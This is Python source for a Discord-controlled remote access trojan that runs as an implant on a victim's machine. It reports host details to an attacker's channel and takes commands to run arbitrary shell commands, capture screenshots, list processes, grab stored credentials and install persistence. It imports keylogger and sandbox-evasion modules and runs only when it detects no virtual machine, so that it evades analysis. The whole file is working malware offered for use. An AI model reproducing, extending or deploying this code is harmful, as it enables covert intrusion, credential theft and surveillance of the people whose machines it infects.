import discord
from discord.ext import commands
from discord import app_commands
import os
import subprocess as sp
import requests
import random
from cv2 import VideoCapture, imwrite
from scipy.io.wavfile import write
from sounddevice import rec, wait
import platform
import re
from urllib.request import Request, urlopen
import pyautogui
from datetime import datetime
import shutil
import sys
from multiprocessing import Process
import threading
import json
import ctypes
import time
import psutil
from libraries import credentials, keylogger, sandboxevasion, disctopia

# Configuration placeholders - will be replaced by build script
GUILD_ID = "{GUILD_ID}"
BOT_TOKEN = "{BOT_TOKEN}"
CHANNEL_ID = {CHANNEL_ID}
KEYLOGGER_WEBHOOK = "{KEYLOGGER_WEBHOOK}"

GUILD = discord.Object(id=GUILD_ID)
CURRENT_AGENT = 0

class Bot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents, help_command=None)

    async def on_ready(self):
        await self.wait_until_ready()
        
        self.channel = self.get_channel(CHANNEL_ID)
        now = datetime.now()
        
        config = disctopia.createConfig()
        agent_id = disctopia.id()
        
        if config:
            msg = f"New Agent Online #{agent_id}"
            color = 0x00ff00
        else:
            msg = f"Agent Online #{agent_id}"
            color = 0x0000FF
            
        my_embed = discord.Embed(title=msg, description=f"**Time: {now.strftime('%d/%m/%Y %H:%M:%S')}**", color=color)
        my_embed.add_field(name="**IP**", value=disctopia.getIP(), inline=True)
        my_embed.add_field(name="**Bits**", value=disctopia.getBits(), inline=True)
        my_embed.add_field(name="**HostName**", value=disctopia.getHostname(), inline=True)
        my_embed.add_field(name="**OS**", value=disctopia.getOS(), inline=True)
        my_embed.add_field(name="**Username**", value=disctopia.getUsername(), inline=True)
        my_embed.add_field(name="**CPU**", value=disctopia.getCPU(), inline=False)
        my_embed.add_field(name="**Is Admin**", value=disctopia.isAdmin(), inline=True)
        my_embed.add_field(name="**Is VM**", value=disctopia.isVM(), inline=True)
        my_embed.add_field(name="**Auto Keylogger**", value=False, inline=True)
        await self.channel.send(embed=my_embed)

    async def setup_hook(self):
        await self.tree.sync(guild=GUILD)

    async def on_command_error(self, ctx, error):
        my_embed = discord.Embed(title=f"**Error:** {error}", color=0xFF0000)
        await ctx.reply(embed=my_embed)

class InteractButton(discord.ui.View):
    def __init__(self, inv: str, id: int):
        super().__init__()
        self.inv = inv
        self.id = id

    @discord.ui.button(label="Interact", style=discord.ButtonStyle.blurple, emoji="🔗")
    async def interactButton(self, interaction: discord.Interaction, button: discord.ui.Button):
        global CURRENT_AGENT
        CURRENT_AGENT = self.id
        await interaction.response.send_message(embed=discord.Embed(title=f"Interacted with agent {self.id}", color=0x00FF00), ephemeral=True)

    @discord.ui.button(label="Terminate", style=discord.ButtonStyle.gray, emoji="❌")
    async def terminateButton(self, interaction: discord.Interaction, button: discord.ui.Button):
        my_embed = discord.Embed(title=f"Terminating Connection With Agent#{self.id}", color=0x00FF00)
        await interaction.response.send_message(embed=my_embed)
        await bot.close()
        sys.exit()

    @discord.ui.button(label="Screenshot", style=discord.ButtonStyle.gray, emoji="🖼️")
    async def screenshot(self, interaction: discord.Interaction, button: discord.ui.Button):
        result = disctopia.screenshot()
        if result != False:
            await interaction.response.send_message(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error while taking screenshot to Agent#{self.id}", color=0xFF0000)
            await interaction.response.send_message(embed=my_embed)

    @discord.ui.button(label="Process", style=discord.ButtonStyle.gray, emoji="📊")
    async def process(self, interaction: discord.Interaction, button: discord.ui.Button):
        result = disctopia.process()
        if len(result) > 4000:
            path = os.environ["temp"] + "\\response.txt"
            with open(path, 'w') as file:
                file.write(result)
            await interaction.response.send_message(file=discord.File(path))
            os.remove(path)
        else:
            await interaction.response.send_message(f"```\n{result}\n```")

    @discord.ui.button(label="Creds", style=discord.ButtonStyle.gray, emoji="🔑")
    async def creds(self, interaction: discord.Interaction, button: discord.ui.Button):
        result = disctopia.creds()
        if result != False:
            await interaction.response.send_message(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error while grabbing credentials from Agent#{self.id}", color=0xFF0000)
            await interaction.response.send_message(embed=my_embed)

bot = Bot()

@bot.hybrid_command(name="interact", with_app_command=True, description="Interact with an agent")
@app_commands.guilds(GUILD)
async def interact_cmd(ctx: commands.Context, id: int):
    global CURRENT_AGENT
    CURRENT_AGENT = id
    my_embed = discord.Embed(title=f"Interacting with Agent#{id}", color=0x00FF00)
    await ctx.reply(embed=my_embed)

@bot.hybrid_command(name="cmd", with_app_command=True, description="Run any command on the target machine")
@app_commands.guilds(GUILD)
async def cmd_command(ctx: commands.Context, command: str):
    agent_id = disctopia.id()
    if int(CURRENT_AGENT) == int(agent_id):
        result = disctopia.cmd(command)
        if len(result) > 2000:
            path = os.environ["temp"] + "\\response.txt"
            with open(path, 'w') as file:
                file.write(result)
            await ctx.reply(file=discord.File(path))
            os.remove(path)
        else:
            await ctx.reply("```" + result + "```")

@bot.hybrid_command(name="screenshot", with_app_command=True, description="Take a screenshot of the target machine's screen")
@app_commands.guilds(GUILD)
async def screenshot_cmd(ctx: commands.Context):
    agent_id = disctopia.id()
    if int(CURRENT_AGENT) == int(agent_id):
        result = disctopia.screenshot()
        if result != False:
            await ctx.reply(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error while taking screenshot to Agent#{agent_id}", color=0xFF0000)
            await ctx.reply(embed=my_embed)

@bot.hybrid_command(name="ls", with_app_command=True, description="List all the current online agents")
@app_commands.guilds(GUILD)
async def ls_cmd(ctx: commands.Context):
    agent_id = disctopia.id()
    if ctx.interaction:
        my_embed = discord.Embed(title=f"Please use **!ls** instead of the slash command", color=0xFF0000)
        await ctx.reply(embed=my_embed)
    else:
        my_embed = discord.Embed(title=f"Agent #{agent_id}   IP: {disctopia.getIP()}", color=0xADD8E6)
        my_embed.add_field(name="**OS**", value=disctopia.getOS(), inline=True)
        my_embed.add_field(name="**Username**", value=disctopia.getUsername(), inline=True)
        view = InteractButton("Interact", agent_id)
        await ctx.reply(embed=my_embed, view=view)

@bot.hybrid_command(name="persistent", with_app_command=True, description="Make the agent persistent on the target machine")
@app_commands.guilds(GUILD)
async def persistent_cmd(ctx: commands.Context):
    agent_id = disctopia.id()
    if int(CURRENT_AGENT) == int(agent_id):
        result = disctopia.persistent()
        if result:
            my_embed = discord.Embed(title=f"Persistence enabled on Agent#{agent_id}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error while enabling persistence on Agent#{agent_id}", color=0xFF0000)
        await ctx.reply(embed=my_embed)

@bot.hybrid_command(name="terminate", with_app_command=True, description="Terminate the agent")
@app_commands.guilds(GUILD)
async def terminate_cmd(ctx: commands.Context):
    agent_id = disctopia.id()
    if int(CURRENT_AGENT) == int(agent_id):
        my_embed = discord.Embed(title=f"Terminating Connection With Agent#{agent_id}", color=0x00FF00)
        await ctx.reply(embed=my_embed)
        await bot.close()
        sys.exit()

if __name__ == "__main__":
    # Run sandbox evasion checks
    if sandboxevasion.test() == True and disctopia.isVM() == False:
        bot.run(BOT_TOKEN)
